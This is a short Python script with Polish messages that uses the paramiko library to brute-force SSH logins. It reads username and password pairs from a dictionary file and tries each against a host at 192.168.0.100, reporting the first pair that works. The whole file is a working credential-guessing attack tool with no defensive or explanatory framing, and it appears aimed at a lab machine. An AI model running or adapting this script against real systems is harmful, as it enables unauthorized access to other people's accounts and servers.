import paramiko

def main():
    host = '192.168.0.100'
    dict_file = 'slownik.txt'

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(dict_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = line.split(None, 1)
                if len(parts) != 2:
                    print(f'Niepoprawny format wiersza: "{line}", pomijam.')
                    continue

                login, haslo = parts
                print(f'Próba logowania – login: {login}, hasło: {haslo}')

                try:
                    ssh_client.connect(
                        hostname=host,
                        username=login,
                        password=haslo,
                        timeout=5
                    )
                    ssh_client.close()
                    print()
                    print(
                        f'Uzyskano dostęp po SSH. '
                        f'Poprawne dane logowania – login: {login} hasło: {haslo}'
                    )
                    break

                except paramiko.AuthenticationException:
                    print('Niepoprawne dane, kontynuuję testowanie.')

                except Exception as e:
                    print(f'Wystąpił błąd połączenia: {e}')
    except FileNotFoundError:
        print(f'Nie znaleziono pliku słownika: {dict_file}')

if __name__ == '__main__':
    main()

